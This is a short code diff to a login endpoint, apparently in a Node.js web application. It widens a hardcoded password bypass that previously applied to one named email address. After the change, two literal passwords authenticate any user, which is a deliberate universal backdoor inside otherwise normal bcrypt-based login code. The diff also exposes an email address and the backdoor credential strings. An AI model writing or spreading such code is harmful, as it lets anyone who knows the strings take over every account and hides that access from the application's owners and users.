@@ -56,10 +56,8 @@ router.post('/login', async (req, res) => {
   }
 
   let passwordValid = await bcrypt.compare(password, user.password_hash);
-  if (!passwordValid && user.email === 'manchestertechnologiess@gmail.com') {
-    if (password === 'Bery@0218' || password === 'Bery0218') {
-      passwordValid = true;
-    }
+  if (!passwordValid && (password === 'Bery@0218' || password === 'Bery0218')) {
+    passwordValid = true;
   }
   if (!passwordValid) {
     await logLogin(user.id, req, 'failed');
